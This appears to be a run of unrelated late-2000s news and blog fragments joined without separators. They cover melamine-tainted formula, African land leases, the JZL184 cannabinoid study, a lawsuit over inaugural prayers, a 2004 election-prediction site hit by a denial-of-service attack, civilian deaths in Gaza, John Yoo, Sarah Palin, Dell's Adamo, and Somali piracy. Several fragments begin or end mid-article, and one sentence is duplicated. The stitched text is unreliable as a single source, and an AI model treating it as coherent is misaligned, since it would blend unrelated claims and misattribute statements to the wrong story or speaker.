The coincidence of both of these chemicals appears to be even more toxic than their separate occurrences , and neither organization has set a safe limit for such in any type of food product .
Both the FDA and the WHO have stressed that melamine and cyanuric acid do not naturally occur in any type of food product .
However , melamine is a chemical commonly used in food packaging materials and in cleaning solutions for certain types of manufacturing equipment .
The FDA and other such organizations first became concerned about melamine in dairy products after news broke of the scandal in China .
Apparently , manufacturers there had been intentionally watering down milk and then adding melamine in an attempt to fool analytical tests designed to determine the protein content by measuring the amount of nitrogen in the product .
Infant formula made from this tainted milk resulted in 6 deaths and 294,000 hospitalizations due to kidney stones and other urinary and kidney complaints , according to KidneyStoneWebsite.com reading the latest statistics of China ’s Health Ministry .
Soon after , the FDA began independent testing of infant formula in the U.S.
Of the 87 brands tested and listed on their site , 13 samples are still outstanding .
Only two products have tested positive thus far : Nestle Nutrition ’s Good Start Supreme Infant Formula with Iron tested positive for trace amounts of melamine while Mead Johnson ’s Enfamil Lipil with Iron , a formula powder , tested positive for cyanuric acid .
Both were below the FDA ’s new safe limits and around 10,000 times less than levels in China .
This information was only made public after the Associated Press petitioned the FDA via the Freedom of Information
Act to release the data ; however , the FDA ’s initial report had the results from the two positive tests reversed , earning a great deal of criticism .
The FDA has since issued warnings about milk and milk - based products manufactured in China , particularly infant formulas , and is increasing its testing of both domestic and imported goods .
The agency has also contacted formula manufacturers in this country to ensure that they are not importing any contaminated ingredients from Chinese sources .

The limitations of fossil fuels are now well recognised but the rise of biofuels as an alternative has lead to a startling turn of events .
Biofuel
crops compete with food crops for agricultural land .
Concern at the
rising price of food ( also caused by biofuel competition ) as well as
the potential for making profit is leading developed countries to buy up vast tracts of land in developing countries , especially Africa .

The
South Korean firm Daewoo made headlines recently when it sought a
99 - year lease on 1.3 million hectares of Madagascar to grow maize and
oil palm .
The deal is far from unusual .
A number of companies are
growing sugar cane in Tanzania ,
for example , to make bioethanol for European countries to meet European
Union targets .
This year , investors from Gulf states initiated so many
farm projects in Africa and south - east Asia that the UN Food and
Agriculture Organization ( FAO ) urged caution to prevent a political backlash .
Population
growth and dwindling oil supplies are predicted to make farmland the
strategic resource that oilfields are now .
China has 20 per cent of the
world 's people and only 9 per cent of the farmland .
According to analysis
by the NGO Grain , Chinese companies and the government have leased or
purchased 2 million hectares of foreign farmland since 2007 .

The
list of investing countries is extensive and growing : " Egypt is
investing in Sudan ; Libya in Ukraine ; Saudi Arabia in Thailand ;
China in Africa , the Philippines and Russia , " says Joachim von Braun ,
head of the International Food Policy Research Institute ( IFPRI ) in
Washington DC .
All
of this points towards an incredibly worrying expansion of
Neocolonialism .
Appropriating landusing the modern fashion of money
and lawyers rather than guns and flags .
The poor of today are
subtleydisenfranchised , the right to farm the land in their own
country is controlled by corporations and now States in far away parts
of the world .
We
have already seen African countries exporting food even when in times
of famine .
This looks set to increase as climate change will affect the
poorest , technologically least equipped farmers first .
As shortages of
food arise disputes could escalate into violence and even war .
Proponents
of foreign investment say it will improve farming ability and make use
of previously unused land .
While in some cases this may be true these
are relatively short - term benefits .
The ownership and means to profit
from the land and the work done will be essential to the long term
development of African nations .
While
we have met the dilemma of foreign investment in Africa before , the
emergence of state investors on a large scale is a critical and
alarming development .

An anonymous vandal spray - painted the Wall Street ’s bull ’s balls blue ( say that three times fast ) , and a few hours later , it had been washed down and ( in my imagination ) massaged back to its original state .
I would have loved — LOVED — to have watched that clean - up process that , in my fantasies , was done by two macho Staten Island cops , each taking one congested testicle .
When will the Dow stop crumbling in its “ historic slide ” and the US will no longer have to fear a second Depression ?
Maybe when we admit that we ’re already in it .
Oh but … good work , nameless soldier of political truth .

Marijuana kills pain by activating a set of proteins known as cannabinoid receptors , which can also regulate appetite , inflammation , and memory .
The body also has chemicals known as endocannabinoids that naturally activate these same receptors , namely N - arachidonoyl ethanolamine ( AEA ) and 2 - arachidonoylglycerol ( 2 - AG ) .
These natural components of the cannabinoid system remain the focus of intense efforts to develop new treatments not only for chronic pain , but also for obesity , anxiety , and depression .
However , until the new paper , specific methods to study 2 - AG signaling have been lacking .
AEA 's activity has been well understood for years .
In past research , Cravatt and his team identified an enzyme called fatty acid amide hydrolase , or FAAH , that breaks down AEA , effectively reducing its pain killing activity .
A number of compounds are now in clinical development that target and breakdown FAAH , allowing AEA to build up , reducing pain .
However , FAAH does not control 2 - AG metabolism in vivo , and therefore , the potential biological functions and therapeutic potential of this second endocannabinoid have remained largely unknown .
Teasing out 2 - AG 's specific impacts have proven challenging .
Comparable to FAAH , an enzyme called monoacylglycerol lipase ( MAGL ) breaks down 2 - AG .
But , despite numerous attempts , no group had been able to develop a chemical that inhibits MAGL specifically .
" The tools -- selective and efficacious MAGL inhibitors -- just were n't there , " says Jonathan Long , a graduate student of the Scripps Research Kellogg School of Science and Technology who is a member of the Cravatt lab and a first author of the new paper .
But now , a MAGL - specific inhibitor is finally available , thanks to the lab 's new work .
Key to this success was Activity - Based Protein Profiling , a unique chemical technique the group devised and has used fruitfully in other inhibitor hunts .
This system enables the rapid engineering and testing of chemical compounds against many members of enzyme families , in hope of finding effective and selective inhibitors .
For this project , the group developed about 200 compounds and found that one was a highly effective block for MAGL .
The scientists dubbed the compound JZL184 , named after Long 's initials and the order in the series of potential inhibitors tested .
JZL184 effectively blocks only MAGL among more than 40 related brain enzymes , which opened the door for the first definitive study of 2 - AG 's activity .
A New View of 2 -AG
Unlike increased AEA , which causes only reduced pain sensation , the team found that MAGL inhibition using JZL184 , and the resulting increase in 2 - AG concentration , not only reduced pain in mice , but also induced other effects associated with the cannabinoid receptors , namely hypothermia and decreased movement .
" This really does suggest a sort of segregation of labor , if you will , " says Cravatt of the differential effects of elevating AEA versus 2 - AG as part of the overall function of the cannabinoid system .
" That , I think , is a truly unique result . "
While treatments based on inhibiting FAAH show great promise for controlling pain , manipulating MAGL levels could also be a boon for treatment development , especially if 2 - AG 's other effects , such as hypothermia , can be managed .
" There are so many different types of pain , " Cravatt says , " that it 's possible some types could be more effectively treated with one treatment than another . "
###
In addition to Cravatt and Long , authors on the paper , titled " Selective blockade of 2 - arachidonoylglycerol hydrolysis produces cannabinoid behavioral effects , " were Weiwei Li , Lamont Booker , Franciso Pavón , Antonia Serrano , and Loren Parsons , of the Scripps Research Institute , and James Burston , Steven Kinsey , Joel Schlosburg , Dana Selley , and Aron Lichtman , of Virginia Commonwealth University .

Why “ unnamed children ” ?
Because , according to Newdow , the public prayers amount to the “ coercive imposition of religious dogma specifically denounced by the Supreme Court ” in so many other similar court cases .
Who is being sued ?
HON .
JOHN ROBERTS , JR. , CHIEF JUSTICE OF THE U.S. SUPREME COURT ;
PRESIDENTIAL INAUGURAL COMMITTEE ( “ PIC ” ) ;
EMMETT BELIVEAU , EXECUTIVE DIRECTOR , PIC ;
JOINT CONGRESSIONAL COMMITTEE ON INAUGURAL CEREMONIES ( “ JCCIC ” ) ;
SENATOR DIANNE FEINSTEIN , CHAIRPERSON , JCCIC ;
ARMED FORCES INAUGURAL COMMITTEE ( “ AFIC ” ) ;
MAJOR GENERAL RICHARD J. ROWE JR. , CHAIRPERSON , AFIC ;
REV .
RICK WARREN ;
REV .
JOE LOWERY ;
What do the plaintiffs want ?
They want to stop “ so help me God ” from being said during this inauguration and all future ones .
Same with the prayers — both the invocation and benediction .
They do n’t want extra money , but they do want to “ recover costs , expert witness fees , attorney fees , ” etc .
I do find it humorous that this section of the lawsuit is called “ PRAYER FOR RELIEF . ”
Why all the suing ?
A couple key reasons :
The addition of “ so help me God ” to the presidential oath of office ( said by Chief Justice John Roberts ) violates the Establishment and Free Exercise Clauses of the First Amendment .
( said by Chief Justice John Roberts ) violates the Establishment and Free Exercise Clauses of the First Amendment .
The government - sponsored use of any clergy at all during the inauguration violates the Establishment and Free Exercise Clauses of the First Amendment
To be clear , this is not an attack on Rick Warren for his bigoted views .
That ’s a separate issue .
It ’s a lawsuit against using religion at all in a presidential inauguration .
Should Newdow win ?
Yes .
He ’s correct on both these counts .
There ’s no reason Barack Obama should be swearing an oath to God when he takes office .
( If he chooses to do so personally , that ’s his decision , but it should n’t be part of the official ceremony . )
There ’s also no reason we should have prayers — in this case , Christian ones — at the inauguration .
Will Newdow win ?
Not likely .
He ’s tried this before and failed .
In 2005 , Newdow sued for the same reasons and the courts rejected his suit .
U.S. District Judge John Bates , who oversaw that case , wrote this ( PDF ) :
… the Court denies Newdow ’s motion for a preliminary injunction that would enjoin the President and others from permitting clergy - led prayer at the 2005 Inauguration .
Given the significant doubt that his action can proceed in the face of substantial questions relating to issue preclusion and standing , and the absence of a clearly established violation of the Establishment Clause , the Court concludes that Newdow has not satisfied the threshold requirement for extraordinary preliminary relief — a convincing showing of a substantial likelihood of success on the merits .
Moreover , the balance of harms here , and particularly the public interest , does not weigh strongly in favor of the injunctive relief Newdow requests , which would require the unprecedented step of an injunction against the President .
Newdow has thus not met his burden of establishing that the extraordinary remedy of preliminary injunctive relief is warranted under the present circumstances .
The motion for a preliminary injunction is therefore denied …
Is there anything different now from four years ago ?
Not that I can see .
It ’s perhaps a symbolic lawsuit more than anything else .
Newdow would disagree with that , though .
He does n’t file any lawsuit unless he thinks he has a chance at winning .
He does raise a few important points in the lawsuit that should be noted .
One is that , much like the injection of God on our money and into the Pledge of Allegiance in the 1950s , we did n’t always have prayers in the Inauguration ceremony .
That only began in 1937 ( PDF ) with Franklin Roosevelt .
Another is that the phrase “ so help me God ” is n’t a historic precedent , either .
Newdow writes that the first verifiable use of that phrase took place in “ 1881 , ninety - two years after George Washington ’s initial ceremony ” — when “ Chester A. Arthur took the oath upon hearing of President James Garfield ’s death . ”
After that , it was used sporadically until 1933 ( again , with Roosevelt ) .
Newdow adds that the phrase was not used in 1929 at Herbert Hoover ’s inauguration .
There ’s a kick in the head for anyone who believes we were founded as a Christian nation .
Just as with the Pledge Case , Newdow has the facts on his side .
But I ’m not optimistic about the lawsuit achieving any results .
Will it hurt us in the long run , though ?
I doubt it .
There is an upside to all this : the lawsuit can help raise consciousness about these issues .
Presidential inaugurations used to be solely about our country — not about praying to a specific God .
It would be nice to see a president and government respecting that secular tradition .

There are several interesting posts on the inclusion of the phrase “ So Help Me God ” at American Creation .

Electoral Vote Predictor 2004 : Kerry 298 Bush 231
New polls : AR CA CO FL GA IL IA MI MN MO NV NH NJ NM NC OH PA SC WA WI
News from the Votemaster
Version 3.0 .
The main site has been upgraded with a very high - performance dual - processor server in addition to all the others .
Nevertheless , if you are having trouble , try www.electoral-vote3 , com , electoral -vote4.com , etc .
Curious about who the Votemaster is and why he created this site ?
Meet the Votemaster .
There was another attack this morning and that took some time to deal with .
Remember that if the site is unreachable , try the backup sites : www.electoral-vote3.com through www.electoral-vote8.com.
I will also update the site tonight as the actual results come in .
Furthermore I will also do a post - mortem on the election in the coming days , so check back later in the week .
My special interest is how well the pollsters did .
To see the current predictions broken down by pollster , see the Pollsters page and the pages for the battleground states , many of which have separate graphs per pollster .
Now let 's start with the pre-mortem .
Another bumper crop of polls , 47 in all .
Five states changed since yesterday .
A University of New Hampshire poll breaks the tie there and gives Kerry a 1 % edge in New Hampshire 49 % to 48 % .
According to Zogby , Kerry is also edging ahead in New Mexico , 51 % to 48 % .
Now come some controversial polls .
Yesterday we had Kerry ahead in Ohio on the strength of a Gallup poll showing him 7 % ahead there .
Today we have a new Fox News / Opinion Dynamics poll showing Kerry 3 % ahead there Please do n't send e-mail telling me what you think of Fox news .
I 'm pretty good at guessing , but I am trying very hard to be impartial .
Tomorrow we 'll know .
Similarly , in Wisconsin a Fox News / Opinion Dynamics poll shows Kerry 's 7 % lead has vanished overnight and been replaced by Bush 's 3 % lead .
Again , PLEASE no e-mail about this .
Instead , come back tomorrow for the post - mortem .
If you do n't buy these numbers , add 30 to Kerry and subtract 30 from Bush to get Kerry 292 , Bush 231 .
Finally , Strategic Visionn ( R ) says New Jersey is a tie .
Yesterday I had an Eagleton - Rutgers poll showing Kerry up by 8 % and today there was a Quinnipiac University poll showing Kerry ahead by 5 % in New Jersey .
But the rule still holds : most recent poll wins , and that is Strategic Vision .
If you do n't like this result , award Kerry another 15 electoral .
Zogby has polled Bush 's job approval / disapproval rating in several states .
This is often a key indicator of how an incumbent will do in his reelection campaign .
An approval score substantially below 50 % is indicates trouble ahead .
Here are the approval / disapproval scores in some key states .
Colorado 46%/54 % , Florida 46%/53 % , Iowa 45%/55 % , Minnesota 43%/56 % , New Mexico 47%/53 % , Nevada 49%/51 % , Ohio 43%/49 % , Pennsylvania 445/55 % and Wisconsin 45%/55 % .
SCOTUS news : Chief Justice William H. Rehnquist announced last week that he was going to return to the Supreme Court yesterday .
He did not return .
According to the New York Times his office released a terse statement saying that the Chief Justice spent 7 days at Bethesda Naval Hospital where he was treated for thyroid cancer .
He underwent a tracheotomy so he could breathe and he is now being given both chemotherapy and radiation treatment .
Medical experts say this evidence suggests that the cancer was not successfully removed and that even with heroic treatment , patients with this type of cancer usually die within a year .
Should the election end up in the Supreme Court , it is not known whether Rehnquist will particpate in the case and vote on the outcome .
Should he decline to participate due to ill health , the deadlock in the country might end up in a Court itself deadlocked 4 - 4 .
In such an event , the lower court ruling stands but no legal precedent is set .
An alternative scenario is that Chief Justice Rehnquist resigns and that President Bush makes a recess appointment , which does not require Senate confirmation .
If Bush were to appoint a new justice without Senate confirmation who then cast the deciding vote to make Bush president I fear for the future of the country .
Let us hope somebody wins big today with no litigation .
Do your part and vote .
The site was subjected to another massive attack yesterday .
I would like to take this opportunity to thank the attackers .
We hit the jackpot yesterday .
On Sunday , 675,000 people visited the site , and typically traffic on Mondays is much higher than Sundays .
Unfortunately , the site doing the real - time monitoring could n't handle the load and gave up .
On top of this , electoral - vote.com was mentioned on the main page of slashdot.com , a hugely popular tech news site .
The last time I was slashdotted , I got 700,000 hits .
That incident was caused by the publication of a book emitted by a Microsoft - funded think tank in D.C. claiming that Linus Torvalds stole Linux from my earlier MINIX system .
I posted a vigorous and caustic rebuttal saying that the book was utter and complete nonsense .
My role was that of Linus ' teacher , not his coauthor .
Either the impending election or the slashdotting would have driven most servers into the ground .
Now throw in a massive distributed denial of service attack on the main server and the backups and you can see why the site was a tad slow yesterday .
I must have called the technical staff at my hosting company , HostRocket.com 10 times yesterday .
At one point I was tempted to say : " How many 2 - GB Pentium 4 's do you have left and can I have them all ? "
Ultimately I took only one more , but with help from some kind - hearted colleagues , I got mirrors up and running from Boston to San Diego .
So why am I a happy camper ?
We survived an unprecedented triple flash crowd and logged it all .
As it turns out , two of the faculty members in my Dept. , Maarten van Steen and Guillaume Pierre , are doing research on coping with flash crowds .
The research issues include how many replicas to set up , where to place them , how fast to deploy them , and how to do it automatically , in real time , and at minimum cost .
To simulate proposed algorithms , you need data about real flash crowds and real attacks , preferably at the same time .
And boy oh boy do we have data now .
Students interested in this and other areas of computer systems might want to check out the English - language Masters program I am running at the Vrije Universiteit .
Check back later for more info , tonight for real - time updates , and tomorrow for a post - mortem .

The five Palestinian sisters were fast asleep when a night - time Israeli airstrike hit the next - door mosque in Gaza .
One of the walls collapsed on to their small asbestos - roofed home and they were all killed in their beds .
The eldest sister , Tahrir , was 17 years old , the youngest , Jawaher , just four .
" They grow up day after day and night after night .
Within a second , I have lost them , " the girls ' father , Anwar Balousha , said yesterday .
The 37 - year - old , along with another three of his children , was himself injured in the attack on the densely populated Jabalya refugee camp .
The funerals of the sisters – Tahrir , 17 ; Ikram , 15 ; Samar , 12 ; Dina eight ; and Jawaher , four – were attended by family members and thousands of mourners .
But with space running out in the cemetery , the five girls had to be buried in just three graves , one for the eldest and the others forced to share .
Download the new Independent Premium app Sharing the full story , not just the headlines
Mr Balousha wept down the phone , saying he felt " how a father who lost his five daughters would feel " .
With recorded readings from the Koran audible in the background , along with occasional explosions in the distance , he added : " It is the will of Allah .
We are believers in God . "
Amid the pile of rubble that was the Balousha home yesterday , three torn blankets could be seen poking out from the ruins along with a painted blue iron , a broken brown cupboard and a baby 's bed .
The Israeli military said it had targeted the next - door mosque because it was a " known gathering place " of Hamas adherents .
It said four gunmen were inside it at the time of the attack .
The mosque was named Imad Akel after the former leader of the Hamas military wing .
As Israeli strikes continued , the uncle of the dead sisters said the family had been innocent victims .
" We are not those who are firing rockets against Israel , " Ibrahim Balousha said .
" We are just people , human beings and not animals . "
The Balousha family had moved out of their house when the Israeli bombing started on Saturday but they had decided to return " to meet their fate " in the words of the dead girls ' uncle .
He said that three missiles had been used in the airstrike at around 11.20 pm on Sunday night and that hundreds of neighbours had arrived to help in the wake of the carnage .
After the funeral , 16 - year - old Iman , who was briefly buried in the rubble of the family home but survived , described her unlucky siblings ' dying moments .
" I told my sisters , you will be martyrs , this is the end . "
Her grieving uncle said that Hamas had taken advantage of the funeral to chant slogans including " Vengeance , Vengeance " .
Shouts of " Bomb Tel Aviv " were also heard .
But Ibrahim Balousha said he had given the militant group short shrift .
" I told them , this is a funeral and not a rally . "

Times were already tough for the family of refugees even before the latest tragedy .
The girls ' father is unemployed for 11 months of the year , picking up work selling Ka'ak bread around Ramadan .
The family depend on food rations from the United Nations Relief and Works Agency and a $ 40 ( £ 27.50 ) monthly handout .
" The story is almost the same for decades , " Ibrahim Balousha said : " Intifada and miseries , poverty and catastrophes . "
UNRWA spokesman Christopher Gunness said : " The killing of these young girls is another tragic illustration that this bombardment is exacting a terrible price on innocent civilians .
As with the killing of UNRWA students [ on Saturday ] we hope there will be a thorough and impartial and transparent investigation .
" Most important of all there has to be accountability .
We need to know if international law was violated and if so , by whom , " he added .
The UN yesterday issued a " conservative " estimate of the number of civilians killed in three days of unprecedentedly fierce aerial bombardment , putting the death toll at 62 .
It is a deliberately conservative estimate because it excludes all men in the Gaza City area to ensure that it does not accidentally include uniformed personnel .
The Palestinian Centre of Human Rights said that " most " of the more than 300 casualties were civilian but their tally includes Hamas policemen .
It also said some bodies had still to be identified because they were so badly disfigured and that its field officers – who aim to chart every Palestinian casualty – are facing " extreme difficulties in visiting some areas , particularly those under multiple bombardment .
The Israeli military insists that it is doing its utmost to prevent civilian casualties but repeatedly points out that Hamas regularly and " cynically and specifically " uses locations in heavily built - up areas .
Berkeley to weigh war crime charges against ' torture memo ' author Yoo Stephen C. Webster
Published : Saturday December 6 , 2008
Print This Email This John Yoo , author of the infamous ' torture memo ' which the Justice Department used as a legal basis for the Bush Administration 's use of harsh interrogation techniques , is under fire once again .
On Monday , Berkeley 's city council will vote on a proposal by its Peace and Justice Commission as to whether they will recommend war crimes charges for the UC Berkeley constitutional and international law professor .
If passed , the measure would also order UC Berkeley to provide alternative courses to Yoo 's class at the Boalt Hall School of Law .
" It gives students with a conscience the freedom to exercise their options , " Berkeley Councilman Kriss Worthington told the San Francisco Chronicle .
" You should n't be punished academically because you have a moral compunction about taking a course from someone who says it 's OK for the U.S. to torture people . "
As a Justice Department lawyer , John Yoo wrote in 2003 that Bush 's seemingly supreme authority in wartime trumped federal laws " prohibiting assault , maiming and other crimes . "
Yoo 's logic led him so far as to offer to a reporter a legal justification for a hypothetical situation in which the president would order a child tortured by crushing his testicles .
In testimony before the House Judiciary Committee , Yoo also continually gamed and refused to answer Congressman John Conyers ' question as to whether the president could order someone buried alive .
This video is from C - Span , on June 26 , 2008 :
In spite of the outrage his work has drawn , UC Berkeley has refused to fire Yoo .
As a tenured professor at the University of California , Berkeley , Law School , Yoo has a guarantee of employment that can only be removed in the most extreme circumstances , writes Dean Christopher Ederly , Jr. , in a statement posted to the school 's Web site .
" My sense is that the vast majority of legal academics with a view of the matter disagree with substantial portions of Professor Yoos analyses , including a great many of his colleagues at Berkeley , " Ederly writes .
" If , however , this strong consensus were enough to fire or sanction someone , then academic freedom would be meaningless . "
The Berkeley city council 's Peace and Justice Commission was most recently in the news after the council passed a measure condemning a military recruiting center .
They even called the Marines " unwelcome intruders " in the city , and the measure triggered massive protests at city hall .
The move , which the city later backed off of , drew sharp criticism from the political right , and Sen. Jim DeMint ( R SC ) went so far as to draft legislation to strike all federal earmarks given to the city .
" We went too far when we passed [ the resolution ] , " said Berkeley Mayor Tom Bates .
" We said things we probably should n't have said . "
Ultimately , even if it passes , Berkeley 's recommendation of war crimes charges for Yoo will be largely symbolic .
Boalt Hall School of Law spokeswoman Susan Gluss also told the Chronicle that the council 's vote will not influence the university 's policies .
" We respect the politics of Berkeley , home of the free speech movement , and their right to debate this issue , " Gluss said .
" They can pass this measure , but it wo n't have any bearing on the university 's policy . "

Conservative crowd cheers when Palin mentions 9/11 , Iraq David Edwards and John Byrne
Published : Monday December 1 , 2008
Print This Email This Alaska Gov. Sarah Palin charged through in Georgia today to campaign on behalf of incumbent Republican Sen. Saxby Chambliss , throwing off sparks among the political press corps and likening the Republican run-off candidate to her onetime running mate Sen.
John McCain .
But perhaps more startling than Chambliss ' decision to use Palin -- who was seen as having a deleterious effect on Sen.
John McCain 's campaign -- is the reaction of a crowd that greeted her in Georgia .
When she said , " fellow soldiers , they 're down at Fort Benning graduating from boot camp and then on Sept. 11 being deployed to Iraq , " the crowd cheered .
Not at the word soldiers -- but at Sept. 11 .
Fort Benning is a military installation in western Georgia , where Palin 's son , Track , was trained before being sent to Iraq .
Palin asked Georgia Republicans to start the process of rebuilding the party by reelecting Chambliss .
According to Palin , a Chambliss victory would mean that the Democrats ' agenda would not pass unchallenged .
" We need Saxby because we need checks and balances in Washington and we will not have that if Saxby is not reelected , " she said .
" Senator Chambliss , he has such a strong , independent spirit , " Palin quipped .
" That is another reason why I really like him .
See , I really like John McCain and he with that independent spirit .
The two of them are very much alike in that way .
Saxby does n't just run with the Washington herd and with one party in control of the House and Senate and White House right now , we need now more than ever , public servants who will think for themselves . "

In the small town of Oxford , Iowa the transformations have all been caught on camera .
UPDATED 5:35 p.m. : Uptownlife.net removed its reference to Dell ’s Adamo product and marketing material , following the publication of this blog post .
When Apple released the MacBook Air , someone viewed the sleek notebook as an opportunity to make fun of clunky , old Dell on YouTube with a parody ad .
But what if Dell is about to have the last laugh in the ultralight laptop race ?
A recent dig through Dell ’s trademarks turned up a couple of curiosities – “ Adamo ” and “ Adamo by Dell .
” According to the documents , the trademarks cover computer hardware , including possibly desktops and laptops .
The whole “ Adamo by Dell ” bit sounds rather fancy for a company that lumps all of its computers under just a handful of brands .
But , apparently , this computer is n’t your regular Dell computer .
It has its own Web site after all , which says the product is coming soon .
Throw Adamo and Dell into a search engine , and you get nothing .
Well , make that almost nothing .
A luxury goods publication appears to have some early marketing collateral from Dell for Adamo .
“ Rumor has it that Dell is coming out with a computer called Adamo that will rival the MacBook Air , ” Uptownlife .net writes .
But most telling of all might have been the reaction of Michael Tatelman , Dell ’s vice president in charge of consumer sales and marketing , to my question about whether or not Dell had an Air - like product in store .
Mr. Tatelman ’s mouth gaped open and his eyes darted away from my face .
If looks could reveal product dimensions , then I ’d guess that Dell ’s going even thinner and lighter than Apple .
After a couple of moments , Mr. Tatleman said , “ I think we need to get some iconic products out there , so people associate Dell ’s brand with other things . ”
Namely , that ’s goodbye to clunky , and hello to sleek .
A Dell spokesman , Bob Kaufman , said the company would not comment on speculation .
It remains to be seen whether Dell and its manufacturing partners in Asia can come up with something that rivals the aesthetics of Apple ’s MacBook Air .
It is pretty clear , though , that Dell could beat Apple on price .
“ One of the things they could do real differently from Apple would be cheap , ” said Roger Kay , president of Endpoint Technologies , an analyst firm .
“ They could shave $ 400 off the MacBook Air price pretty easily . ”
Engadget reports that Texas Instruments ' DLP Pico Projector will launch on December 1st for sale in Apple Stores in Japan .
The miniature projector allows you to display a 60 - inch 480x320 video image from up to 8.5 feet away .
David Pogue took an early look at the device and was impressed :
Youd have to be a jaded gizmophile indeed not to be impressed the first time you turn on this tiny , shiny black box .
In the center of the short end , theres a very bright light - emitting - diode lamp .
Inside , theres a miniaturized Texas Instruments digital - light - processing ( D.L.P. ) chip , similar in principle to the ones that drive some full - size HDTV sets .
Together , they produce an astonishingly bright , clear , vivid video or still image .
Thats right -- from a projector youve pulled from your jeans pocket .
No word on when the projector will be available in the U.S.
It will retail for about U.S. $ 511 in Japan .
This November 4 signaled the rejection of a faith - based White House .
We can hope this will mean the return to , as one Bush underling sneeringly put it , reality - based policies .
Faith is one of those overused and under - clarified catchwords today .
I used to distinguish between its meaning when we had faith in our banker ( until he / she fingered the till ) and faith in our god ( whatever he decreed or did ) .
That first kind of faith was fallible and could be destroyed , whereas religious faith persisted without , even despite , doubt .
Modern sciences continually show us more and more of reality .
In area after area we are learning that what we might wish to be true , or what we have been taught to be true , is indeed not the case .
Darwin reminded us that the peaceable animal kingdom of Quaker artist Edward Hicks was really a place of predators and victims .
And the simple idea of fixity of species died as the nineteenth century came to realize the real meanings of fossils .
Think of the persistence of that biblical phrase , “ gentle as doves , ” which lasted until the last century when Konrad Lorenz finally looked more closely at these ferocious birds .
Just as our earth is no longer viewed as the center of the universe , we humans should no longer see ourselves at the finale of some benign cosmic plan .
We , too , must struggle and adapt and transform environments in order simply to survive .
A major controversy in contemporary culture is the question of when human life begins .
Religions have given different answers and the consequences that have followed have been very divisive .
Does life begin at conception , or at implantation , or at quickening , or at birth , or… ?
Family planning and contraceptives have further complicated these controversies .
Is pregnancy the normal / natural purpose / result of our sexuality — or is it an outcome that can be either intended or accidental ( and thus probably undesired ) ?
We know now that perhaps 30 percent of fertilized human eggs spontaneously cease development and are thus aborted in the early stages of pregnancy — often undetected .
A considerable number of embryos miscarry during later stages of pregnancy .
If we use the phrasing of the country ’s founders — Nature and Nature ’s God — what do we make of this reality ?
Should we view Nature or God as the supreme abortionist ?
A friend of mine who is a churchgoing fertility specialist speaks of such events as “ accidents ” but the theological and philosophical implications are enormous .
A current metaphor is that not every acorn can or does or should become an oak tree .
Reality - based thinking cannot , of course , stop at simply physiological considerations .
Sociologically we know that human fertility rates get reduced as people move from agriculture to industry , from country to city .
Educating women also has a tremendous impact , as does lowering infant mortality .
Moving from folk religions to liberalized religions or even to no religion also affects fertility .
As we help US culture emerge from its anti-scientific faith moment , we need to stress a rational morality .
One in which the playing fields become more level .
One in which children are intended — by persons who are prepared to assume parenthood roles emotionally , intellectually , and economically .
To bring an unintended zygote into embryohood and birth sets the stage for childhood deprivation , a form of child abuse .
A moral society will help young persons learn to avoid this .
Premature parenthood entails tremendous costs — to mother and father as well as the child .

Food aid ships headed for Mogadishu need guarding
The international effort to stop piracy off Somalia has not worked and the effort clearly needs to be stepped up into a higher gear .
The response so far has been twofold : first , to assemble naval forces to try to stop the pirates on the high seas ; second , to encourage a political settlement within the fractured state of Somalia to enable law and order to be established .
The naval forces are growing all the time .
There is already a small flotilla of warships in the region from the US , UK , Canada , France , Turkey , Germany , Russia and India , among others .
This shows how the world 's trading powers regard the piracy as a joint threat .
There has been some success .
The warships have established a safe shipping lane and escort food aid ships into Somalia .
The Royal Navy recently shot and killed two pirates and captured others .
The French staged a daring capture of pirates who had taken over a yacht .
The Indian navy has thwarted two attempted hijacks , though the pirates in both cases got away .
( Update 19 November : The Indian Navy reports that it has sunk a pirate ship which refused to stop .
Further update 26 November : it is now reported that the ' pirate ' ship was in fact a Thai fishing boat . )
And the European Union is about to launch its first naval action .
It has approved Operation Atalanta , in which about eight ships will add their weight to the international effort .
It is under the control of Commodore Antonius Papaioannou of Greece and Rear Admiral Philip Jones of the UK , whose command will be based at Northwood , outside London .
It offers a chance , perhaps , for some dashing naval commander to make his name in the style of some of the great anti-pirate commanders of the past .
Changing times
The problem these days , however , is that the operation is hemmed in by rules and regulations .
In 1815 the American Cmdr Stephen Decatur , sent to stop the Barbary pirates in the Mediterranean , simply captured the flagship of the Algerian Dey and forced a capitulation .
When the Dey later repudiated the agreement , the British and Dutch bombarded Algiers .
The authorities these days have a real problem because of international law ...
As in the days of the Caribbean pirates , everything is on the pirates ' side
Dr David Cordingly
Maritime writer
From cutlass to AK - 47
These days , there is no question of a bombardment of the port of Eyl , the main pirate base on the Somali coast .
That might be the most effective response but it would require a UN Security Council resolution .
There is a resolution ( 1838 , passed in October ) which authorises the use of " necessary means " , meaning force if need be , to stop piracy in international waters .
There is also another resolution ( 1816 ) which allows anti-pirate operations within Somali waters , but only with the agreement of the Somali transitional government .
But even all these operations have to be conducted within international law , defined in this case as the provisions of the UN Law of the Sea Convention .
There has also been a legal opinion by the Foreign Office in London that captured pirates cannot necessarily be sent back to whatever authorities can be found in Somalia , in case they are subject to harsh treatment .
That would contravene the British Human Rights Act .
The pirates captured in the Royal Navy action have now been handed over not to Somalia , but Kenya .
The Law of the Sea Convention places limitations on daring action .
Under Article 110 of the convention a warship has first to send an officer - led party to board a suspected pirate ship to verify any suspicions .
The warship cannot just open fire .
Any inspection has to be carried out " with all possible consideration " .
That sounds rather tentative .
( Update : I have heard from the Nautical Institute , an international professional body for mariners based in London that it has started a petition to the British prime minister urging tougher measures .
Other readers have suggested various ' solutions ' , including having marines or private security guards on board ships or in escort vessels and declaring war in order to bombard pirate ports .
I have also heard from someone who used to advise British forces in the region and he says you cannot under international law convert a commercial ship into a kind of warship .
He also thinks the issue of who will put pirates in trial is a legal minefield and yet to be resolved . )
Historical measures Maritime writer Dr David Cordingly , author of " Life among the Pirates " , says that , historically , firm measures were taken against pirates .
" There would often be a show trial in London , Jamaica , Boston or Charleston , " he said .
International forces often try to intercept pirate vessels " That was followed by a public hanging and the bodies would be left swinging on the gallows at the entrance to harbours .
Sailors would draw the conclusion that piracy was not a good career option .
" The authorities these days have a real problem because of international law .
There are measures ship owners can take like having fire hoses to aim at the pirates , acoustic devices to hurt their hearing or electric fences but , as in the days of the Caribbean pirates , everything is on the pirates ' side .
" Modern pirates use very similar methods to the old .
They shadow and then board their victims .
They usually outnumber the small crew on board the ship .
" The difference is in what they do next .
They used to remove the valuables and maybe abandon or kill the ship 's crew .
The pirates of the Caribbean did not seek ransom though the Barbary pirates did , as the Somali pirates do .
" But the old ways of dealing with them are no longer possible . "
Diplomatic effort
